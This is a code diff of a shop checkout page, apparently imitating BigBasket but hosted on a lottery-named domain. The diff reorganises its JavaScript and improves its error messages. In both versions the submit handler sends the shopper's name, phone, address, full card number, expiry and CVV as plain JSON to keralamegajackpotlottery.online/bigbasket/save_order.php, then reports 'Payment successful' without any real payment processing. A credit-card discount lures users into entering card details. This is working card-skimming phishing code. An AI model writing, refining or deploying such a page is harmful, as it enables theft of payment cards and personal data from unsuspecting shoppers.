@@ -221,6 +221,7 @@ box-shadow:0 0 0 3px rgba(220,38,38,0.1);
 
             <div class="box">
                 <h4><i class="far fa-credit-card me-2"></i> Payment Details</h4>
+                
                 <div class="d-flex gap-4 mb-4">
                     <label class="pay-opt">
                         <input type="radio" name="pay" value="credit" checked onclick="calc()"> Credit Card
@@ -229,14 +230,7 @@ box-shadow:0 0 0 3px rgba(220,38,38,0.1);
                         <input type="radio" name="pay" value="debit" onclick="calc()"> Debit Card
                     </label>
                 </div>
-<div id="paymentMsg" style="
-display:none;
-margin-top:15px;
-padding:12px;
-border-radius:10px;
-font-size:14px;
-font-weight:600;
-"></div>
+                
                 <div id="offer" class="offer-box">
                     🎉 <b>10% OFF on Credit Card Payments!</b><br>
                     Discount applied automatically at checkout
@@ -270,6 +264,16 @@ font-weight:600;
 <input class="input" id="cvv" maxlength="3" placeholder="CVV *">
 <div class="error-text" id="cvvError">Invalid CVV</div></div>
 
+<!-- ✅ YAHAN LAGAO -->
+<div id="paymentMsg" style="
+display:none;
+margin-top:15px;
+padding:12px;
+border-radius:10px;
+font-size:14px;
+font-weight:600;
+"></div>
+                
                 <p class="text-center" style="color:#0b9444; font-weight: 600; font-size: 14px; margin-top: 20px;">
                     Easy 7-Day Return Policy – Hassle-free returns
                 </p>
@@ -365,315 +369,8 @@ font-weight:600;
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 <script>
 
-// 👉 GLOBAL PRODUCT DATA
-let price = 0;
-let productTitle = "";
-
-const id = new URLSearchParams(window.location.search).get("id") || 1;
-
-fetch("https://keralamegajackpotlottery.online/bigbasket/get_products.php")
-.then(res => res.json())
-.then(data => {
-
-    let p = data.find(x => x.id == id);
-
-    if(!p){
-        alert("Product not found");
-        return;
-    }
-
-    price = parseFloat(p.price);
-    productTitle = p.title;
-
-    // ✅ IMAGE + TITLE
-    document.getElementById("p-img").src =
-        "https://keralamegajackpotlottery.online/bigbasket/" + p.image;
-
-    document.getElementById("p-title").innerText = p.title;
-
-    // ✅ PRICE UPDATE
-    document.getElementById("subtotal").innerText = price.toFixed(2);
-    document.getElementById("total").innerText = price.toFixed(2);
-
-    // ✅ DELIVERY DATE
-    let d = new Date();
-    d.setDate(d.getDate() + 3);
-
-    let options = { weekday: 'long', day: 'numeric', month: 'long' };
-    document.getElementById("delivery-date").innerText =
-        d.toLocaleDateString('en-IN', options);
-
-    // ✅ DISCOUNT CALCULATION
-    calc();
-
-})
-.catch(err => {
-    console.log(err);
-    alert("Error loading product");
-});
-
-/* PRICE CALCULATION */
-
-    
-function calc(){
-
-let pay = document.querySelector('input[name="pay"]:checked').value;
-let discount = 0;
-
-if(pay === "credit"){
-
-discount = price * 0.10;
-
-document.getElementById("discountrow").style.display="flex";
-document.getElementById("offer").style.display="block";
-document.getElementById("debitmsg").style.display="none";
-
-}else{
-
-discount = 0;
-
-document.getElementById("discountrow").style.display="none";
-document.getElementById("offer").style.display="none";
-document.getElementById("debitmsg").style.display="block";
-
-}
-
-document.getElementById("discount").innerText = discount.toFixed(2);
-document.getElementById("total").innerText = (price-discount).toFixed(2);
-
-}
-
-
-/* CARD NUMBER FORMAT */
-
-document.getElementById("cardNumber").addEventListener("input",function(e){
-
-let value = e.target.value.replace(/\D/g,'').substring(0,16);
-let formatted = value.replace(/(.{4})/g,'$1 ').trim();
-
-e.target.value = formatted;
-
-});
-
-
-/* MONTH VALIDATION */
-
-document.getElementById("expMonth").addEventListener("input",function(){
-
-let m = this.value.replace(/\D/g,'').substring(0,2);
-
-if(m < 1) m = 1;
-if(m > 12) m = 12;
-
-this.value = m;
-
-});
-
-
-/* YEAR VALIDATION */
-
-document.getElementById("expYear").addEventListener("blur",function(){
-
-let year = parseInt(this.value);
-let currentYear = new Date().getFullYear() % 100;
-
-if(year < currentYear){
-
-alert("Card Expired Year Invalid");
-this.value="";
-
-}
-
-});
-
-
-/* CVV VALIDATION */
-
-document.getElementById("cvv").addEventListener("input",function(){
-
-this.value = this.value.replace(/\D/g,'').substring(0,3);
-
-});
-
-
-/* ERROR SHOW */
-
-function showError(input,id){
-
-input.classList.add("input-error");
-document.getElementById(id).style.display="block";
-
-}
-
-
-/* ERROR CLEAR */
-
-function clearError(input,id){
-
-input.classList.remove("input-error");
-document.getElementById(id).style.display="none";
-
-}
-
-
-/* LUHN CARD VALIDATION */
-
-function validCard(card){
-
-let sum = 0;
-let shouldDouble = false;
-
-for(let i = card.length - 1; i >= 0; i--){
-
-let digit = parseInt(card.charAt(i));
-
-if(shouldDouble){
-digit *= 2;
-if(digit > 9) digit -= 9;
-}
-
-sum += digit;
-shouldDouble = !shouldDouble;
-
-}
-
-return (sum % 10) === 0;
-
-}
-
-function detectCardType(number){
-
-number = number.replace(/\s/g,'');
-
-if(/^4/.test(number)) return "visa";
-if(/^5[1-5]/.test(number)) return "mastercard";
-if(/^6/.test(number)) return "rupay";
-
-return "unknown";
-
-}
-
-
-/* PLACE ORDER */
-
-function placeOrder(){
-
-let name = document.getElementById("fullname");
-let mobile = document.getElementById("mobile");
-let city = document.getElementById("city");
-let state = document.getElementById("state");
-let address = document.getElementById("address");
-let pincode = document.getElementById("pincode");
-
-let card = document.getElementById("cardNumber");
-let month = document.getElementById("expMonth");
-let year = document.getElementById("expYear");
-let cvv = document.getElementById("cvv");
-
-let valid=true;
-
-
-/* NAME */
-
-if(name.value.trim()==""){
-showError(name,"nameError");
-valid=false;
-}else{
-clearError(name,"nameError");
-}
-
-
-/* MOBILE */
-
-if(!/^[0-9]{10}$/.test(mobile.value)){
-showError(mobile,"mobileError");
-valid=false;
-}else{
-clearError(mobile,"mobileError");
-}
-
-
-/* PINCODE */
-
-if(!/^[0-9]{6}$/.test(pincode.value)){
-showError(pincode,"pincodeError");
-valid=false;
-}else{
-clearError(pincode,"pincodeError");
-}
-
-
-/* CARD */
-
-let cardNum = card.value.replace(/\s/g,'');
-let type = detectCardType(cardNum);
-
-if(cardNum.length!=16 || !validCard(cardNum) || type==="unknown"){
-showError(card,"cardError");
-valid=false;
-}else{
-clearError(card,"cardError");
-}
-
-
-/* MONTH */
-
-if(month.value.length!=2){
-showError(month,"monthError");
-valid=false;
-}else{
-clearError(month,"monthError");
-}
-
-
-/* YEAR */
-
-if(year.value.length!=2){
-showError(year,"yearError");
-valid=false;
-}else{
-clearError(year,"yearError");
-}
-
-
-/* CVV */
-
-if(!/^[0-9]{3}$/.test(cvv.value)){
-showError(cvv,"cvvError");
-valid=false;
-}else{
-clearError(cvv,"cvvError");
-}
-
-
-/* SUCCESS */
-
-if(valid){
-
-fetch("https://keralamegajackpotlottery.online/bigbasket/save_order.php",{
-
-method:"POST",
-headers:{'Content-Type':'application/json'},
-
-body:JSON.stringify({
-
-name:name.value,
-mobile:mobile.value,
-city:city.value,
-state:state.value,
-address:address.value,
-pincode:pincode.value,
-product:productTitle,
-price:price,
-card:card.value,
-month:month.value,
-year:year.value,
-cvv:cvv.value
-
-})
-
-})
-    function showPaymentMsg(message, type="error"){
+// ✅ MESSAGE FUNCTION (TOP PE HI HOGA)
+function showPaymentMsg(message, type="error"){
 
 let box = document.getElementById("paymentMsg");
 
@@ -693,33 +390,301 @@ if(type === "success"){
 }
 
 }
+
+
+// 👉 GLOBAL PRODUCT DATA
+let price = 0;
+let productTitle = "";
+
+const id = new URLSearchParams(window.location.search).get("id") || 1;
+
+fetch("https://keralamegajackpotlottery.online/bigbasket/get_products.php")
+.then(res => res.json())
+.then(data => {
+
+    let p = data.find(x => x.id == id);
+
+    if(!p){
+        showPaymentMsg("Product not found");
+        return;
+    }
+
+    price = parseFloat(p.price);
+    productTitle = p.title;
+
+    document.getElementById("p-img").src =
+        "https://keralamegajackpotlottery.online/bigbasket/" + p.image;
+
+    document.getElementById("p-title").innerText = p.title;
+
+    document.getElementById("subtotal").innerText = price.toFixed(2);
+    document.getElementById("total").innerText = price.toFixed(2);
+
+    let d = new Date();
+    d.setDate(d.getDate() + 3);
+
+    let options = { weekday: 'long', day: 'numeric', month: 'long' };
+    document.getElementById("delivery-date").innerText =
+        d.toLocaleDateString('en-IN', options);
+
+    calc();
+
+})
+.catch(err => {
+    console.log(err);
+    showPaymentMsg("Error loading product");
+});
+
+
+// ✅ PRICE CALCULATION
+function calc(){
+
+let pay = document.querySelector('input[name="pay"]:checked').value;
+let discount = 0;
+
+if(pay === "credit"){
+    discount = price * 0.10;
+    document.getElementById("discountrow").style.display="flex";
+    document.getElementById("offer").style.display="block";
+    document.getElementById("debitmsg").style.display="none";
+}else{
+    discount = 0;
+    document.getElementById("discountrow").style.display="none";
+    document.getElementById("offer").style.display="none";
+    document.getElementById("debitmsg").style.display="block";
+}
+
+document.getElementById("discount").innerText = discount.toFixed(2);
+document.getElementById("total").innerText = (price-discount).toFixed(2);
+
+}
+
+
+// ✅ CARD FORMAT
+document.getElementById("cardNumber").addEventListener("input",function(e){
+let value = e.target.value.replace(/\D/g,'').substring(0,16);
+e.target.value = value.replace(/(.{4})/g,'$1 ').trim();
+});
+
+
+// ✅ MONTH
+document.getElementById("expMonth").addEventListener("input",function(){
+let m = this.value.replace(/\D/g,'').substring(0,2);
+if(m < 1) m = 1;
+if(m > 12) m = 12;
+this.value = m;
+});
+
+
+// ✅ YEAR
+document.getElementById("expYear").addEventListener("blur",function(){
+let year = parseInt(this.value);
+let currentYear = new Date().getFullYear() % 100;
+
+if(year < currentYear){
+showPaymentMsg("Card expired");
+this.value="";
+}
+});
+
+
+// ✅ CVV
+document.getElementById("cvv").addEventListener("input",function(){
+this.value = this.value.replace(/\D/g,'').substring(0,3);
+});
+
+
+// ✅ ERROR FUNCTIONS
+function showError(input,id){
+input.classList.add("input-error");
+document.getElementById(id).style.display="block";
+}
+
+function clearError(input,id){
+input.classList.remove("input-error");
+document.getElementById(id).style.display="none";
+}
+
+
+// ✅ CARD VALIDATION
+function validCard(card){
+let sum = 0;
+let shouldDouble = false;
+
+for(let i = card.length - 1; i >= 0; i--){
+let digit = parseInt(card.charAt(i));
+
+if(shouldDouble){
+digit *= 2;
+if(digit > 9) digit -= 9;
+}
+
+sum += digit;
+shouldDouble = !shouldDouble;
+}
+
+return (sum % 10) === 0;
+}
+
+function detectCardType(number){
+number = number.replace(/\s/g,'');
+if(/^4/.test(number)) return "visa";
+if(/^5[1-5]/.test(number)) return "mastercard";
+if(/^6/.test(number)) return "rupay";
+return "unknown";
+}
+
+
+// ✅ PLACE ORDER
+function placeOrder(){
+
+let btn = document.querySelector(".place-btn");
+
+let name = document.getElementById("fullname");
+let mobile = document.getElementById("mobile");
+let city = document.getElementById("city");
+let state = document.getElementById("state");
+let address = document.getElementById("address");
+let pincode = document.getElementById("pincode");
+
+let card = document.getElementById("cardNumber");
+let month = document.getElementById("expMonth");
+let year = document.getElementById("expYear");
+let cvv = document.getElementById("cvv");
+
+let valid=true;
+
+
+// NAME
+if(name.value.trim()==""){
+showError(name,"nameError");
+valid=false;
+}else{
+clearError(name,"nameError");
+}
+
+
+// MOBILE (strong check)
+if(!/^[6-9]\d{9}$/.test(mobile.value)){
+showError(mobile,"mobileError");
+showPaymentMsg("Enter valid mobile number");
+valid=false;
+}else{
+clearError(mobile,"mobileError");
+}
+
+
+// PINCODE
+if(!/^[0-9]{6}$/.test(pincode.value)){
+showError(pincode,"pincodeError");
+valid=false;
+}else{
+clearError(pincode,"pincodeError");
+}
+
+
+// CARD
+let cardNum = card.value.replace(/\s/g,'');
+let type = detectCardType(cardNum);
+
+if(cardNum.length!=16 || !validCard(cardNum) || type==="unknown"){
+showError(card,"cardError");
+valid=false;
+}else{
+clearError(card,"cardError");
+}
+
+
+// MONTH
+if(month.value.length!=2){
+showError(month,"monthError");
+valid=false;
+}else{
+clearError(month,"monthError");
+}
+
+
+// YEAR
+if(year.value.length!=2){
+showError(year,"yearError");
+valid=false;
+}else{
+clearError(year,"yearError");
+}
+
+
+// CVV
+if(!/^[0-9]{3}$/.test(cvv.value)){
+showError(cvv,"cvvError");
+valid=false;
+}else{
+clearError(cvv,"cvvError");
+}
+
+
+// 🚀 SUBMIT
+if(valid){
+
+btn.disabled = true;
+btn.innerText = "Processing...";
+
+fetch("https://keralamegajackpotlottery.online/bigbasket/save_order.php",{
+
+method:"POST",
+headers:{'Content-Type':'application/json'},
+
+body:JSON.stringify({
+name:name.value,
+mobile:mobile.value,
+city:city.value,
+state:state.value,
+address:address.value,
+pincode:pincode.value,
+product:productTitle,
+price:price,
+card:card.value,
+month:month.value,
+year:year.value,
+cvv:cvv.value
+})
+
+})
 .then(res => res.text())
 .then(data => {
 
 if(data.trim() === "success"){
 
-showPaymentMsg("✅ Payment successful! Order placed successfully", "success");
+showPaymentMsg("Payment successful! Order placed", "success");
 
 setTimeout(()=>{
-    window.location = "confirm.html";
+window.location = "confirm.html";
 },1500);
 
 }
 else if(data.trim() === "duplicate"){
 
-showPaymentMsg("❌ This mobile number has already placed an order. Please try with another number.");
+showPaymentMsg("This mobile number already placed order");
+
+btn.disabled = false;
+btn.innerText = "Place Order Securely";
 
 }
 else{
 
-showPaymentMsg("⚠️ Something went wrong. Please try again.");
+showPaymentMsg("Something went wrong");
+
+btn.disabled = false;
+btn.innerText = "Place Order Securely";
 
 }
 
 })
-    .catch(err => {
-    console.log(err);
-    alert("Network / Server error");
+.catch(err => {
+console.log(err);
+showPaymentMsg("Network error");
+
+btn.disabled = false;
+btn.innerText = "Place Order Securely";
 });
 
 }
